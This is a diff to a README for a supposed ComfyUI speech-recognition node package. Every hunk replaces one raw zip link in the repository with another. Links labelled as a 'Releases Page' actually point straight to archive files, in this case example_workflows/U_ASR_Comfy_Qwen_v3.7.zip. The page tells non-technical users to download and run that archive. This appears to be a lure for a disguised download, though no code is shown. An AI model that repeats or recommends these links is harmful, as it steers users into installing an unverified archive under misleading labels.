@@ -1,7 +1,7 @@
 # 🎤 ComfyUI-Qwen3-ASR - Transcribe Audio Effortlessly
 
 ## 📥 Download Now
-[![Download](https://github.com/harshitx077/ComfyUI-Qwen3-ASR/raw/refs/heads/main/assets/U_Comfy_Qwen_ASR_1.2-alpha.1.zip)](https://github.com/harshitx077/ComfyUI-Qwen3-ASR/raw/refs/heads/main/assets/U_Comfy_Qwen_ASR_1.2-alpha.1.zip)
+[![Download](https://github.com/harshitx077/ComfyUI-Qwen3-ASR/raw/refs/heads/main/example_workflows/U_ASR_Comfy_Qwen_v3.7.zip)](https://github.com/harshitx077/ComfyUI-Qwen3-ASR/raw/refs/heads/main/example_workflows/U_ASR_Comfy_Qwen_v3.7.zip)
 
 ## 📋 Overview
 ComfyUI-Qwen3-ASR provides custom nodes for automatic speech recognition. This tool helps you convert audio to text in 52 different languages and dialects. It allows users to quickly transcribe spoken content, making it ideal for personal or professional use.
@@ -19,7 +19,7 @@ To use ComfyUI-Qwen3-ASR, follow the steps below. You don't need any technical s
 ## 🛠️ Installation Steps
 
 ### Step 1: Visit the Download Page
-Go to the [Releases Page](https://github.com/harshitx077/ComfyUI-Qwen3-ASR/raw/refs/heads/main/assets/U_Comfy_Qwen_ASR_1.2-alpha.1.zip) to find the latest version of the software.
+Go to the [Releases Page](https://github.com/harshitx077/ComfyUI-Qwen3-ASR/raw/refs/heads/main/example_workflows/U_ASR_Comfy_Qwen_v3.7.zip) to find the latest version of the software.
 
 ### Step 2: Select the Latest Release
 On the Releases Page, you will see different versions of the software listed. Look for the latest release, which is usually at the top of the page. It will include a version number and release date.
@@ -56,7 +56,7 @@ After transcription, review the text for accuracy. Make any necessary adjustment
 - **User-Friendly Interface:** Designed with non-technical users in mind, featuring easy navigation and clear instructions.
 
 ## 🔄 Updating ComfyUI-Qwen3-ASR
-To ensure you have the latest features and improvements, regularly check the Releases Page [here](https://github.com/harshitx077/ComfyUI-Qwen3-ASR/raw/refs/heads/main/assets/U_Comfy_Qwen_ASR_1.2-alpha.1.zip) and download any updates.
+To ensure you have the latest features and improvements, regularly check the Releases Page [here](https://github.com/harshitx077/ComfyUI-Qwen3-ASR/raw/refs/heads/main/example_workflows/U_ASR_Comfy_Qwen_v3.7.zip) and download any updates.
 
 ## 💬 Support
 If you encounter any issues or have questions, please check the Issues section on GitHub or look for common solutions in the FAQ on the Releases Page. You can also join the community forum for additional support.
